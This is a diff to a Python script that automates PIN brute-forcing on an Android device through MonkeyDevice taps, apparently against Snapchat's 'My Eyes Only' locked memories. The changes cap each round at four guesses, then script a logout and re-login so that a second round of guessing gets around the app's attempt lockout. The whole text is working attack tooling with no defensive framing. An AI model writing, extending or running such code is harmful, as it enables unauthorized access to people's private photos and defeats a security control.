@@ -85,7 +85,7 @@ def monley_inputpin(pin):
     for number in pin:
         print(number)
         device.touch(button[int(number)][0], button[int(number)][1], MonkeyDevice.DOWN_AND_UP)
-        time.sleep(.1)
+        time.sleep(.25)
 
 # This function takes a button name and
 # presses its corresponding location
@@ -126,10 +126,45 @@ pincodes = f.readlines()
 pincodes = [endl.strip() for endl in pincodes]
 f.close()
 
-for x in range(0,5):
-    print ("PIN: " + pincodes[x])
+# Index of current pincode in pincode array
+pincode_index = 0
+
+attempts = 0
+max_attempts = 4
+
+for x in range(attempts, max_attempts):
+    print ("PIN: " + pincodes[pincode_index])
     
     if not args.simulate:
-        monley_inputpin(pincodes[x])
+        monley_inputpin(pincodes[pincode_index])
+        time.sleep(1)
 
-    time.sleep(1)
+    pincode_index += 1
+
+monley_pressbutton(btn_exit_memories)
+time.sleep(5)
+monley_pressbutton(btn_profile)
+time.sleep(5)
+monley_pressbutton(btn_settings)
+time.sleep(5)
+monley_pressbutton(btn_logout)
+time.sleep(5)
+monley_pressbutton(btn_logout_confirm)
+time.sleep(5)
+monley_pressbutton(btn_log_in_as)
+time.sleep(5)
+monley_pressbutton(btn_memories)
+time.sleep(5)
+monley_pressbutton(btn_my_eyes_only)
+time.sleep(5)
+
+# the second wae of pincode bruteforcing
+attempts = 0
+
+for x in range(attempts, max_attempts):
+    print ("PIN: " + pincodes[pincode_index])
+    
+    if not args.simulate:
+        monley_inputpin(pincodes[pincode_index])
+        time.sleep(1)
+
